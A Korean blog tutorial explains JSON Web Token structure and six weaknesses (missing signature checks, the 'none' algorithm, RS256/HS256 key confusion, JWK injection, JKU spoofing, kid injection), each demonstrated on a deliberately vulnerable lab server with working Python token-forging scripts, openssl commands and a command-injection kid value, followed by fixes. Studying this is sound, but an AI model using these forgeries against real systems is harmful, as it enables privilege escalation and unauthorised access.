---
title: "JWT (JSON Web Token) 취약점 알아보기"
date: 2022-06-24
draft: false
description: "JWT (JSON Web Token) 취약점 알아보기"
tags: ["web","jwt"]
categories: ["security"]
---


<img src=featured.png width=50% alt="thumbnail" style="display: block;margin: auto"/>


JSON Web Token을 간단히 알아보고 발생할 수 있는 취약점들을 소개하고자 합니다.
일부 취약점 Exploitation(실습)에서 사용한 환경은 아래와 같으며,
자세한 내용은 [JSON Web Token - 취약점 실습 환경 구축]({{< ref "posts/20220722-jwt_test_env/index.md" >}})에서 확인하실 수 있습니다.

> - 취약한 서버 : [jwt-hacking-challenges](https://github.com/onsecru/jwt-hacking-challenges)
> - 공격 도구 : [PostMan](https://web.postman.com/), [jwt_tool](https://github.com/ticarpi/jwt_tool), python3



# 😸 01 JSON Web Token(JWT)이란
JSON Web Token(이하 JWT, 토큰)은 웹표준(RFC 7519)으로써 **암호화**와 **검증(Signature)** 기능을 가진 **인증 토큰**입니다.

## 💥 JWT 구조
구조는 아래와 같습니다.

`Base64(Header).Base64(Payload).Base64(Signature)`

Header에는 사용 된 보안 메커니즘(암호 알고리즘 등)에 대한 정보가, 
Data에는 전달할 정보가, 
Signature에는 `Base64(Header).Base64(Data)`를 Header에 명시된 알고리즘으로 암호화된 문자열이 담깁니다.

예를 들어, 다음 토큰 `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
에는 다음 정보가 포함되어 있습니다.
- Header : `{"alg": "HS256","typ": "JWT"}`
- Payload : `{"sub": "1234567890","name": "John Doe","iat": 1516239022}`
- Signature : `HMACSHA256(base64UrlEncode(header)+"."+base64UrlEncode(payload), your-256-bit-secret)`

> JWT의 무결성을 보장하기 위해 여러 서명 알고리즘(alg)을 사용할 수 있습니다.
> - RSA based
> - Elliptic curves
> - HMAC
> - **None**

# 😸 02 JWT 취약점
이 글에서는 아래 6가지 취약점을 다루려고 합니다.
- Signature 미확인
- None 알고리즘 사용
- 비대칭 알고리즘을 대칭 알고리즘으로 변경
- JKW Injection
- JKU Spoofing
- kid injection

## 💥 02-01 Signature 미확인
JWT 구현 시 Signature 확인 과정이 누락될 경우, Data의 내용을 변조하여 권한 상승 등의 취약점에 노출될 수 있습니다.

### 🩸 Exploitation
### --- Step 01 토큰 확인
토큰을 Base64 디코딩하여 확인합니다.
`{"alg":"HS256","typ":"JWT"}.{"name":"John Doe","user_name":"john.doe",  "perm":"user"}`
### --- Step 02 Payload 변조
Paload 부분을 변조합니다. 해당 토큰에서는 `"perm":"user"`를 `"perm":"admin"`로 변조합니다.
`{"alg":"HS256","typ":"JWT"}.{"name":"John Doe","user_name":"john.doe",  "perm":"admin"}`
### --- Step 03 토큰 사용
변조된 Payload 부분을 Base64 인코딩하여 기존의 토큰에 대치시킵니다. Signature 검증이 미흡할 경우 토큰이 유효하게 됩니다.

### 🔒 대응 방안
서버 측에서 Signature 검증을 수행합니다.
보통, verify 함수를 이용해 디코딩된 `Header.Data` 값과 복호화된 `Signature`를 비교 검증하는 방식으로 수행합니다.

## 💥 02-02 None 알고리즘 사용
SSL(Null Cipher 포함)과 마찬가지로 JWT는 서명에 대해 **None** 알고리즘을 지원합니다.
응용 프로그램을 디버깅하기 위해 도입된 것으로 보이나 이는 서명 검증을 우회할 수 있어 응용 프로그램의 보안에 심각한 영향을 줄 수 있습니다.

### 🩸 Exploitation
None 알고리즘을 지원하는 경우, JWT를 디코딩하여 "alg" 부분을 "None"으로 변조한 후 시그니처 부분을 제거하면 Payload 부분을 변조하여도 인증이 되는 것을 확인 할 수 있습니다.

### --- Step 01 토큰 획득
PostMan에서 '**none-obtail-token**' 요청을 수행하여 토큰을 획득합니다.
![get token](1.png)

### --- Step 02 토큰 디코딩
[jwt.io](https://jwt.io/)에서 획득한 토큰을 디코딩합니다.

![token decoding](2.png)

### --- Step 03 Header(alg), Payload(role) 변조
아래 Python 코드에서 
`headDict` 변수에 Header의 **"alg"를 "none"으로 변조**하여 대입하고
`paylDict` 변수에 Payload의 **"role"을 "Admin"으로 변조**하여 대입한 후
각 Header와 Payload를 Base64 인코딩하여 `Base64(Header).Base64(Payload).` 만을 사용합니다.

> 해당 코드는 [JWT_Tool](https://github.com/ticarpi/jwt_tool)에서 필요한 부분을 가져와 수정하였습니다.

![temper payload](3.png)

### --- Step 03 변조된 토큰 사용

PostMan의 '**kc-send-token**' 항목에서 Signature 부분 제거된 토큰을 패킷에 삽입한 후 전송하면 "role"이 "Admin"으로 변조된 토큰이 유효하게 처리된 것을 확인할 수 있습니다.

![use tempered token](4.png)


### 🔒 대응 방안
서버 측에서 JWT의 **None** 알고리즘을 사용하지 않도록 합니다.
유효한 알고리즘만을 허용하는 것을 권장합니다.

Exploitation에서 사용한 "app.js" Node.js 어플리케이션의 경우, 아래와 같이 **none** 알고리즘의 허용 부분을 제거하여 조치합니다.
![mitigation](5.png)
조치 결과, 공격 시도 시 아래와 같은 응답을 받습니다.
```
{
    "name": "JsonWebTokenError",
    "message": "invalid algorithm"
}
```


## 💥 02-03 비대칭 알고리즘을 대칭 알고리즘으로 변경
서버 측에서 사용 알고리즘에 대해 검증하지 않을 경우, **비대칭(RS256) 암호화 알고리즘을 대칭(HS256) 암호화 알고리즘으로 변경**한 후 **공개키를 대칭키(비밀키, 사전에 공유된 키)로 사용**할 수 있으며, 이를 이용해 Payload를 변조하고 Signature(서명) 검증을 통과할 수 있습니다.

상세 원리는 아래와 같습니다.

JWT는 대칭(HS256) 및 비대칭(RS256) 암호화 알고리즘을 모두 사용할 수 있으며 암호화 유형에 따라 비밀키 또는 공개키-개인키 쌍을 사용합니다.

| 알고리즘 | 서명-키 |  검증-키 |
| --- | --- | --- |
| 비대칭(RS256) | 개인키 | 공개키 |
| 대칭(HS256) | 비밀키 | 비밀키 |

또한, 각 알고리즘은 다음과 같은 라이브러리 함수를 이용하여 검증됩니다.
- 토큰이 HS256(HMAC)로 서명된 경우 : **verify(token, secret)**
- 토큰이 RS256(RSA) 또는 이와 유사한 방식으로 서명된 경우 : **verify(token, publicKey)**

그러므로, 알고리즘을 RS256에서 HS256으로 변경하면 **publicKey**가 **secret**으로 사용됩니다.
publickey는 별도로 획득해야하며 방법은 아래와 같습니다.

### ❗ Publickey 획득 방법
**[ CASE 1 ]** TLS/SSL HTTPS 접속에 사용된 공개키 재사용
홈페이지 HTTPS 통신 시 사용한 개인키를 토큰 서명에 사용하는 경우가 존재하므로, HTTPS 접속 시 사용하는 공개키를 획득, 취약점 악용에 이용합니다.
리눅스에서는 아래 명령어를 이용해 공개키를 획득할 수 있습니다.

```
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem 
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
**[ CASE 2 ]** API 공개키 경로 노출
**"/API/v1/keys"**와 같이 API에서 공개키를 사용하기 위해 접근하는 경로에 직접 접속하여 공개키를 얻습니다. 경로는 API Document 또는 웹 프록시 도구의 히스토리 상에서 확인할 수 있습니다.
**[ CASE 3 ]**. JWK 공통 경로
아래 경로의 JWK(JSON Web Key)에서 일부 클레임에 공개키가 존재할 수 있습니다.
```
/.well-known/jwks.json
/openid/connect/jwks.json
/jwks.json
/api/keys
/api/v1/keys
```
**[ CASE 4 ]**. jku 또는 x5u 클레임의 URL
공개키가 포함된 URL을 가리키는 클레임을 확인하여 해당 URL에서 공개키를 획득할 수 있습니다.
```
jku - JWKS URL을 가리키는 클레임
x5u - X509 인증서 위치를 가리키는 클레임 (JWKS 파일에 있을 수 있음)
```
**[ CASE 5 ]**. iss 클레임 내의 공개키 경로 단서
JWT의 iss 클레임에서 JWT를 생성한 외부 발급자 서비스 또는

API의 이름, 공개키의 URL 등 단서를 얻을 수 있습니다.

### 🩸 Exploitation
Header의 알고리즘(alg)를 RS256에서 HS256으로 변경한 후, 서버 HTTPS 인증서 공개키를 재활용하여 서명 시 토큰이 유효한 것을 확인할 수 있습니다. 공격자는 해당 토큰의 Payload를 임의로 변조하고 서명할 수 있게됩니다.

### --- Step 01 토큰 획득
PostMan에서 'kc-obtain-token' 요청을 전송하여 토큰을 획득합니다.
![get token](6.png)

### --- Step 02 토큰 디코딩
획득한 토큰을 디코딩합니다.

![decoding token](7.png)

### --- Step 03 공개키 획득
JWT Header의 알고리즘을 HS256으로 변조한 후 서명에 사용할 공개키(Secret)을 찾습니다.
해당 서버 어플리케이션에서는 HTTPS 인증 시 사용하는 개인키, 공개키를 토큰 서명/검증에도 재사용하므로 HTTPS 인증서를 이용하여 공개키를 생성합니다.

아래 명령어를 이용해 인증서를 획득하여 'certificatechain.pem' 이름으로 저장합니다. 이때, 마지막 라인에 줄바꿈을 삽입하여 저장합니다.
```
openssl s_client -connect {your hostname}:443
```
![get public key1](8.png)
![get public key2](9.png)


아래 명령어로 인증서를 이용해 공개키를 생성합니다. 이것 또한, 마지막 라인에 줄바꿈을 삽입하여 'pubkey.pem' 파일명으로 저장합니다.
```
openssl x509 -pubkey -in certificatechain.pem -noout
```
![create public key](10.png)


### --- Step 04 Header(alg), Payload(role) 변조
아래 Python 코드를 이용해 변조된 토큰을 생성합니다.
`headDict` 변수에 Header의 **"alg"를 "HS256"으로 변조**하여 대입하고
`paylDict` 변수에 Payload의 **"role"을 "Admin"으로 변조**하여 대입한 후
'Step 3'에서 저장한 공개키('pubkey.pem')를 이용해 서명하여 토큰을 생성합니다.
> 해당 코드는 [JWT_Tool](https://github.com/ticarpi/jwt_tool)에서 필요한 부분을 가져와 수정하였습니다.

```python
import json
import base64
import hashlib
import hmac

#공개키 경로 
key = open("C:\\Users\\my_pc\\pubkey.pem").read()

#아래 headDict, paylDict 변조
headDict = {"alg": "none","typ": "JWT"}
paylDict = {"account": "Bob","role": "Admin","iat": 1658058021,"aud": "https://127.0.0.1/jwt/key-confusion"}

newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
newContents = newContents.encode().decode('UTF-8')

newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")

print(newContents+"."+newSig)
```


### --- Step 05 변조한 토큰 사용
'kc-send-token' 요청에 'Step 4'의 변조 토큰을 패킷에 포함하여 전송하면 유효하게 처리되는 것을 확인할 수 있습니다.
![use temperd token](11.png)

### 🔒 대응 방안
verify()이 취약점을 피하기 위해 애플리케이션은 토큰을 메서드에 전달하기 전에 수신된 토큰의 알고리즘이 유효한 알고리즘인지 확인해야 합니다.

'app.js'에서는 아래와 같이 verify 시 HS256 알고리즘이 사용되지 않도록 조치합니다.
![hs256 algorithm](12.png)

조치 결과, 변조된 토큰 전송 시 아래와 같이 에러를 응답받습니다.
```
{
    "name": "JsonWebTokenError",
    "message": "invalid algorithm"
}
```

## 💥 02-04 JKW Injection
RSA와 같은 비대칭 알고리즘 사용 시 복호화에 사용하는 공개키를 JWK (JSON Web Key) 형태로 Header에 포함시킬 수 있습니다. JWK가 포함된 토큰과 JWK는 아래와 같이 구성됩니다.
```
"header": {
        "alg": "RS256",
        "typ": "JWT",
        "jwk": {
            "kty": "RSA",
            "kid": "key-0",
            "use": "sig",
            "e": "AQAB",
            "n": "2_AgfALcXXh5eYJRPOS4..."
        }
},
"payload": {
        "account": "Bob",
        "role": "User",
        "iat": 1659513521,
        "aud": "https://127.0.0.1/jwt/key-injection"
},
"signature": {"..."}

```


```
"jwk": {
     alg: 알고리즘 (RS256 등),  
     kid: Key ID,
     kty: Key의 타입 (RSA 또는 EC(Elliptic Curve)),
     e: RSA public exponent,
     n: RSA modulus,
     use: 퍼블릭 키가 어떤 용도로 사용되는지 명시 ("sig"(signature) or "enc"(encryption))
}
```

**그러나 서버에서 JWT 검증 시 Header에 포함된 공개키를 직접적으로 참조하여 검증에 사용할 경우, 악의적인 사용자에 의해 토큰이 변조될 수 있습니다.**
토큰의 데이터를 변조한 후 임의의 개인키로 서명, 해당 개인키로 공개키를 생성하여 JWK 형태로 토큰의 Header에 포함시켜 서버로 전송하면 토큰 검증을 통과할 수 있게됩니다.

### 🩸 Exploitation

### --- Step 01 토큰 생성 후 내용 확인
POSTMan의 'ki-obtain-token', 'ki-send-token'에서 토큰 생성 후 검증하여 내용을 확인합니다.
![ki-obtain-token](13.png)
![ki-send-token](14.png)



### --- Step 02 개인키 생성
OpenSSL을 이용하여 임의의 개인키를 생성합니다.
```
openssl genrsa -out private_key.pem 2048
```

### --- Step 03 토큰 변조
아래 파이썬 코드를 이용하여 변조된 토큰을 Step 02에서 생성한 개인키로 서명합니다.
코드의 설명은 주석을 참고바랍니다.
> 해당 코드는 [JWT_Tool](https://github.com/ticarpi/jwt_tool)에서 필요한 부분을 가져와 수정하였습니다.

```python
import base64
import json
from Cryptodome.Signature import PKCS1_v1_5
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA
from termcolor import cprint

# 아래 명령어로 생성한 개인키 가져옴
# openssl genrsa -out private_key.pem 2048
myKey = open("C:\\Users\\pc_name\\private_key.pem").read()


# 사용자가 제공한 개인키를 이용해 JWK를 생성한 후 토큰을 사인
def jwksEmbed(newheadDict, newpaylDict):
    newHead = newheadDict
    pubKey, privKey = getRSAKeyPair()
    new_key = RSA.importKey(pubKey)
    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
    newjwks = buildJWKS(n, e, "skitttles")
    newHead["jwk"] = newjwks
    newHead["alg"] = "RS256"
    key = privKey    
    newContents = genContents(newHead, newpaylDict)
    newContents = newContents.encode('UTF-8')
    h = SHA256.new(newContents)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        cprint("Invalid Private Key", "red")
        exit(1)
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
    return newSig, newContents.decode('UTF-8')


# 사용자가 입력한 개인키를 이용해 공개키 생성
def getRSAKeyPair():
    privKey = RSA.importKey(myKey)
    pubKey = privKey.publickey().exportKey("PEM")

    return pubKey, privKey


# 빈 JWK 생성
def buildJWKS(n, e, kid):                                       
    newjwks = {}
    newjwks["kty"] = "RSA"
    newjwks["kid"] = kid
    newjwks["use"] = "sig"
    newjwks["e"] = str(e.decode('UTF-8'))
    newjwks["n"] = str(n.decode('UTF-8').rstrip("="))
    return newjwks


# 'Header.Payload'를 Base64 인코딩
def genContents(headDict, paylDict, newContents=""):
    if paylDict == {}:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."
    else:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newContents.encode().decode('UTF-8')


if __name__ == '__main__':
	# 토큰을 변조하여 아래 headDict, PaylDict에 대입
    headDict = {"alg": "RS256","typ": "JWT"}
    paylDict = {"account": "Bob","role": "Admin","iat": 1659430187,"aud": "https://127.0.0.1/jwt/key-injection"}

    # 변조된 JWT를 JWK로 사인하여 출력
    newSig, newContents = jwksEmbed(headDict, paylDict)

    print(newContents+"."+newSig)
```
### --- Step 04 변조된 토큰 전송
Step 03에서 생성된 토큰을 서버에 보내면 성공적으로 검증되며 페이로드가 변조된 것을 확인할 수 있습니다.
![send tempered token](15.png)


### 🔒 대응 방안
검증 시 사용하는 공개키는 토큰의 헤더에서 가져오는 것이 아니라, 서버에서 명시적으로 정한 값을 이용해야 합니다.

app.js 에서는 다음과 같이 조치합니다.
![mitigation in app.js](16.png)

## 💥 02-05 JKU Spoofing
jku 라는 클레임을 이용하여 JWK가 포함된 URL을 참조할 수 있습니다. 서명을 확인할 때 서버는 이 URL에서 JWK를 가져와서 사용합니다. jku가 포함된 토큰은 아래와 같습니다.

```
"header": {
        "alg": "RS256",
        "typ": "JWT",
        "jku": "https://127.0.0.1/webkeys/jwks.json"
},
"payload": {
        "account": "Bob",
        "role": "User",
        "iat": 1659514192,
        "aud": "https://127.0.0.1/jwt/jku"
},
"signature": "..."

```
**서버에서 토큰 검증 시 jku 클레임의 URL이 유효하고 검증된 것인지 확인하지 않고 사용할 경우, 
악의적인 사용자가 jku 값을 자신의 JWK URL로 바꾼 후 해당 URL에 포함된 키로 서명하여 토큰 검증을 통과할 수 있습니다.**


### 🩸 Exploitation

### --- Step 01 토큰 생성 후 내용 확인
POSTMan의 'jku-obtain-token', 'jku-send-token'에서 토큰 생성 후 검증하여 내용을 확인합니다.
![jku-obtain-token](17.png)
![jku-send-token](18.png)

### --- Step 02 개인키 생성
OpenSSL을 이용하여 임의의 개인키를 생성합니다.
```
openssl genrsa -out private_key.pem 2048
```

### --- Step 03 토큰 변조
아래 파이썬 코드를 이용하여 변조된 토큰을 Step 02에서 생성한 개인키로 서명합니다.
코드의 설명은 주석을 참고바랍니다.
> 해당 코드는 [JWT_Tool](https://github.com/ticarpi/jwt_tool)에서 필요한 부분을 가져와 수정하였습니다.


```python
import base64
import json
from datetime import datetime
from Cryptodome.Signature import PKCS1_v1_5
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA
from termcolor import cprint


myPrivKeyPath = "C:\\Users\\pc_name\\private_key.pem"


# 입력받은 Header와 Payload를 Base64 인코딩하여 출력
def genContents(headDict, paylDict, newContents=""):
    if paylDict == {}:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."
    else:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newContents.encode().decode('UTF-8')


# n, e, kid를 입력받아 JWK를 생성
def buildJWKS(n, e, kid):                                       
    newjwks = {}
    newjwks["kty"] = "RSA"
    newjwks["kid"] = kid
    newjwks["use"] = "sig"
    newjwks["e"] = str(e.decode('UTF-8'))
    newjwks["n"] = str(n.decode('UTF-8').rstrip("="))
    return newjwks


# 공격자의 jku 경로에 포함시킬 JWK 생성
def jwksGen(headDict, paylDict, jku, privKey, kid="skitttles"):
    newHead = headDict
    nowtime = str(int(datetime.now().timestamp()))
    
    # 개인키 가져옴
    key = RSA.importKey(open(myPrivKeyPath).read())
    pubKey = key.publickey().exportKey("PEM")
    privKey = key.export_key(format="PEM")
    new_key = RSA.importKey(pubKey)

    # 공개키로 n, e 값 생성
    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
    privKeyName = myPrivKeyPath
    newjwks = buildJWKS(n, e, kid)
    newHead["jku"] = jku
    newHead["alg"] = "RS256"
    key = RSA.importKey(privKey)
    newContents = genContents(newHead, paylDict)
    newContents = newContents.encode('UTF-8')

    # 토큰 서명
    h = SHA256.new(newContents)
    signer = PKCS1_v1_5.new(key)
    try:
        signature = signer.sign(h)
    except:
        cprint("Invalid Private Key", "red")
        exit(1)
    
    # 서명 값 Base64 인코딩
    newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")

    # 생성된 JWK 포맷에 맞추어 줌
    jwksout = json.dumps(newjwks,separators=(",",":"), indent=4)
    jwksbuild = {"keys": []}
    jwksbuild["keys"].append(newjwks)
    fulljwks = json.dumps(jwksbuild,separators=(",",":"), indent=4)

    # jwks_jwttool_RSA_{현재시간}.json 파일에 JWK 값 출력
    jwksName = "jwks_jwttool_RSA_"+nowtime+".json"
    with open(jwksName, 'w') as test_jwks_out:
            test_jwks_out.write(jwksout)
        
    return newSig, newContents.decode('UTF-8'), jwksout, privKeyName, jwksName, fulljwks


if __name__ == '__main__':
    # 토큰을 변조하여 아래 딕셔너리에 대입
    headDict = {"alg": "RS256","typ": "JWT"}
    paylDict = {"account": "Bob","role": "Admin","iat": 1659430187,"aud": "https://127.0.0.1/jwt/jku"}

    # 공격자의 jwks URL을 jku 변수에 대입
    jku = "http://{my-url}/jwks.json"
    kid = "skitttles"

    newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku, myPrivKeyPath, kid)

    print(newContents+"."+newSig)
```

### --- Step 04 생성된 JWK 업로드하여 URL 생성
Step 03에서 토큰 생성 시 파이썬 코드가 있는 경로에 "jwks_jwttool_RSA_{time}.json" 포맷으로 파일이 생성됩니다.
해당 파일 내에 JWK가 존재하며, 이 JWK를 Step 03에서 jku로 입력하였던 URL에 업로드합니다.
실제 환경에서는 "JWK 생성 -> 업로드 -> 업로드 URL를 jku에 적용하여 토큰 생성" 순서로 수행될겁니다.
![create url](19.png)

### --- Step 05 변조된 토큰 전송
Step 03 코드 실행 시 토큰이 생성되며 해당 토큰을 서버에 보내면 성공적으로 검증되며 페이로드가 변조된 것을 확인할 수 있습니다. (role을 Admin으로 변조)
![send tempered token](20.png)


### 🔒 대응 방안
검증 시 사용하는 jku는 화이트 리스트 기반의 검증된 URL이어야 합니다. URL로 요청하기전 jku의 값이 사전에 정한 URL인지 확인하는 로직이 필요합니다.

app.js 에서는 다음과 같이 조치합니다.
![](21.png)
"https://server.com/webkey/jwks.json" 과 같이 고정된 URL이나 jku 클레임에 입력된 값을 검증하여 필터링합니다.


## 💥 02-06 kid injection
토큰 검증 시 사용하는 키를 찾기위해 Header의 kid 값을 이용할 수 있습니다. DB, 파일 시스템 상에서 kid 값을 기반으로 검색하여 찾은 파일/값을 토큰 검증 키로 사용하게 됩니다.
kid 값이 포함된 토큰은 아래와 같습니다.
```
"header": {
        "alg": "HS256",
        "typ": "JWT",
        "kid": "keyfile.txt"
},
"payload": {
        "account": "Bob",
        "role": "User",
        "iat": 1659522727,
        "aud": "https://127.0.0.1/jwt/kid00"
},
"signature": "..."
```
**Header의 kid 값은 사용자가 임의로 변조할 수 있으므로 검증되지 않은 값은 들어가지 않도록 필터링해야 합니다.
필터링하지 않을 경우, 서버 어플리케이션의 로직에 따라, SQL injection, Path Traversal, OS Command injection 등 다양한 공격을 이용하여 토큰 검증을 통과하거나 다른 피해를 끼칠 수 있습니다.**


### 🩸 Exploitation
kid 값으로 파일명을 받는 경우, 해당 파일을 읽어들이는 로직이 어플리케이션에 존재할 것이므로, "../../../" 등을 이용하여 다른 경로의 읽을 수 있는 파일로 변경하거나
OS Command injection을 시도하여 키 값을 공격자의 의도대로 변경 해볼 수 있습니다.
단, OS Command injection 공격은 서버 어플리케이션이 파일을 읽을 때 'exec' 등 명령어 실행 로직을 사용해야 유효합니다.

해당 글에서는 OS Command injection을 이용하여 토큰의 키를 공격자 의도대로 바꿔보도록 하겠습니다.

### --- Step 01 토큰 생성 후 내용 확인
POSTMan의 'kid00-obtain-token', 'kid00-send-token'에서 토큰 생성 후 검증하여 내용을 확인합니다.
![kid00-obtain-token](22.png)
![kid00-send-token](23.png)


### --- Step 02 키 값으로 사용할 파일 내용 작성
"test.txt" 파일을 생성하여 내용에 "111" 입력 후 줄바꿈을 삽입합니다.
다음 단계에서 Injection 할 Command가 echo 인데, echo는 문자열 출력 후 줄바꿈까지 출력하기 때문입니다.

<img src="24.png" width=40% style="display: block; margin: auto"/>



### --- Step 03 토큰 변조
아래 파이썬 코드를 이용하여 kid 클레임에 "../../../../../../../../../../../../dev/null;echo 111" 값을 넣은 후 토큰을 생성합니다.
"/dev/null" 파일을 읽어 아무 값도 출력되지 않도록 한 후, "echo 111" 명령어를 실행하여 "111{줄바꿈}" 값이 키 값으로 들어가도록 유도하였습니다.

> 해당 코드는 [JWT_Tool](https://github.com/ticarpi/jwt_tool)에서 필요한 부분을 가져와 수정하였습니다.

```python
import base64
import json
from termcolor import cprint
import hashlib
import hmac

# Header, Payload 딕셔너리를 Base64 인코딩하여 출력
def genContents(headDict, paylDict, newContents=""):
    if paylDict == {}:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."
    else:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newContents.encode().decode('UTF-8')


if __name__ == '__main__':
    # 토큰을 변조하여 headDict, paylDict에 입력
    # kid 값에 OS Command injection을 시도하여 출력이 "111{줄바꿈}"이 되도록 하였음
    headDict = {"alg": "HS256","typ": "JWT","kid": "../../../../../../../../../../../../dev/null;echo 111"}
    paylDict = {"account": "Bob","role": "Admin","iat": 1659520555,"aud": "https://127.0.0.1/jwt/kid00"}

    # 사용할 키 값 읽어옴
    key = open("test.txt").read()

    newContents = genContents(headDict, paylDict)
    newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")

    print(newContents+"."+newSig)
```


### --- Step 04 변조된 토큰 사용
kid 값을 변조한 토큰 전송 시 검증에 통과하는 것을 볼 수 있습니다. (role을 Admin으로 변경)
![use tempered token](25.png)


### 🔒 대응 방안
1. kid 값을 이용할 때 "exec"와 같이 명령어를 실행하는 함수 사용을 자제해야 합니다. 파일 입출력 함수, DB 연결 함수 등 고유 함수를 이용하는 것이 좋습니다.
2. kid로 입력되는 값을 신뢰하지 않습니다. 유효하고 의도된 값만 입력되도록 검증하여 SQL injection, OS Command injection, Path traversal 등 공격을 방지합니다.

app.js 에서는 다음과 같이 조치합니다.
![mitigation in app.js](26.png)


# 📝 03 Epilogue

장기간에 걸쳐 JWT의 취약점에 대해 분석하고 나름대로 취약한 환경을 만들어 실습까지 해보았습니다. 직접 해보는 것만큼 기억에 오래 남는 것은 없다고 생각하여 해왔던 것인데 완성하고 보니 뿌듯하네요. 

✔ 추가할 취약점이 있거나 잘못된 부분이 있다면 지적 부탁드립니다!


# 📖 04 References
[1] https://github.com/ticarpi/jwt_tool

[2] https://github.com/onsecru/jwt-hacking-challenges

[3] https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology

[4] https://github.com/onsecru/jwt-hacking-challenges

[5] https://hackyboiz.github.io/2021/11/20/in0hack/2021-11-20/